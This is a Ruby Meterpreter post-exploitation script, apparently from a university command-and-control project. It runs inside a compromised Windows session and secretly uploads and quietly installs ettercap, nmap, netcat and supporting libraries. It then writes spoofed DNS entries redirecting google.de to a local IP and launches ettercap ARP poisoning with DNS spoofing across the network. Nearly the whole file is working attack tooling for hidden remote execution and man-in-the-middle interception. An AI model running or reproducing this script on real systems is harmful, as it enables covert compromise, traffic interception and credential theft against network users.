def cleardnscache(session)
	print_status("Clearing DNS Cache")
	session.sys.process.execute("cmd /c ipconfig /flushdns",nil, {'Hidden' => true})
end

def execute(session, cmd_string)
  client.sys.process.execute("cmd.exe /c #{cmd_string}", nil, {'Hidden' => 'true'})
end

def execute_verbose(session, cmd_string)
  r = session.sys.process.execute("cmd.exe /c #{cmd_string}", nil, {'Hidden' => true, 'Channelized' => true})
  while(d = r.channel.read)
    print_status("\t#{d}")
  end
  r.channel.close
  r.close
end

def install_libs(session, local_path)
	file_libs = ["WindowsInstaller-KB893803-v2-x86.exe",
							"vcredist_x86.exe",
							"vcredist2008_x86.exe",
							"winpcap-4.12.exe"]
	
	commands = ["WindowsInstaller-KB893803-v2-x86.exe /q /norestart",
							"vcredist_x86.exe /q",
							"vcredist2008_x86.exe /q",
							"winpcap-4.12.exe /S"]
	remote_location = session.fs.file.expand_path("%TEMP%")
	
	file_libs.each do |file|
		print_status("Uploading #{file} ...")
		session.fs.file.upload_file("#{remote_location}\\#{file}","#{local_path}/#{file}")
		print_status("#{file} uploaded!")
		end
	
	commands.each do |cmd|
		cmd = remote_location + "\\" + cmd
		print_status("Executing #{cmd} ...")
		execute(session, cmd)
		sleep(10)
	end
end

def install_app(session, local_path)
	remote_location = session.fs.file.expand_path(".")
	fname = local_path[local_path.rindex("/") +1 .. -1]
	print_status("Uploading #{fname} ...")
	session.fs.file.upload_file("#{remote_location}\\#{fname}","#{local_path}")
	print_status("#{fname} uploaded!")
	print_status("Executing #{fname} ...")
	sleep(5)
	execute(session, remote_location + "\\" + fname)
	print_status("Done.")
end

def start_ettercap_dns(session, entry)
	cleardnscache(session)
	dns_file = session.fs.file.expand_path("%SYSTEMROOT%")+"\\System32\\ettercap\\share\\etter.dns"
	entry.each_line do |d|
		execute(session, "echo #{d} >> #{dns_file}")
	end
	session.run_cmd("cd ettercap")
	print_status "Starting ettercap ..."
	execute(session, "ettercap.exe -T -q -P dns_spoof -M arp // //")
end

def start_ettercap_filter(session, filter)
	#TODO, da Nutzung noch ungewiss
end

session = client
local_path ="/home/dima/studium/fidius/git/candc/vendor/"
ip_spoofing = "192.168.88.132"
domain_entry = "google.de\tA\t#{ip_spoofing} "
domain_entry += "*.google.de\tA\t#{ip_spoofing} "
domain_entry += "www.google.de\taPTR\t#{ip_spoofing} "
	
filter = ""
#print_status ENV['FIDIUS']

case args[0]
	when "-ilibs"
		print_status("Installing libs ...")
		install_libs(session, local_path)
			
	when "-iettercap"
		print_status("Installing ettercap ...")
		install_app(session, local_path + "ecap.exe")
			
	when "-inmap"
		print_status("Installing nmap ...")
		install_app(session, local_path + "nmap.exe")
			
	when "-incat"
		print_status("Installing ncat ...")
		install_app(session, local_path + "nc.exe")
		
  when "-dns"
    start_ettercap_dns(session, domain_entry)
      
  when "-filter"
    start_ettercap_filter(session, filter)
    
	else    
		print_status "Usage:" 
		print_status "-ilibs - Install libs"
		print_status "-iettercap - Install ettercap (windir\system32\ettercap\ettercap.exe)"
		print_status "-inmap - Install nmap (windir\system32\nmap\nmap.exe)"
		print_status "-incat - Install netcat (windir\system32\netcat.exe)"
		print_status "-dns - DNS-Spoofing (www.google.de -> IP)"
		print_status "-filter - Use EttercapNG with Filters"
end